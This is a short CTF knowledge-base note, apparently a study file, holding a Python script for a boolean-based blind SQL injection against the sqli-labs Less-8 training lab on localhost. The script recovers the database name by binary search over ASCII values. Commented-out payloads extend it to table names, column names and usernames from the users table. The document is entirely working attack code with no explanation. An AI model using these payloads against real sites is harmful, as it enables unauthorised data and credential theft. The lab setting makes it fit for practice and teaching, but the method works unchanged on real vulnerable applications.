# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SQL.md
# TITLE: SQL
# CATEGORY: web

import requests
import time
url = "http://127.0.0.1/sqli-labs/Less-8/"
data= ""
for i in range(10000):
    min = 32
    max = 128
    while (min < max) :
        mid = (min + max) // 2
        # 爆破数据库名
        payload = "?id=1\'and if(ascii(substr(database(),{},1))>{},1,0)%23".format(i, mid)
        # 爆破表名
        #payload = "?id=1\'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'security\'),{},1))>{},1,0)%23".format(i, mid)
        # 爆破字段
        #payload = "?id=1\'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'users\'),{},1))>{},1,0)%23".format(i, mid)
        # 爆破数据
        #payload = "?id=1\'and if(ascii(substr((select group_concat(username) from users),{},1))>{},1,0)%23".format(i, mid)
        urls = url+payload
        print(urls)
        response = requests.get(url=urls)
        if "You" in response.text:
            min = mid+1
        else:
            max = mid
        mid = (min + max) // 2
    data += chr(mid)
    print(data)
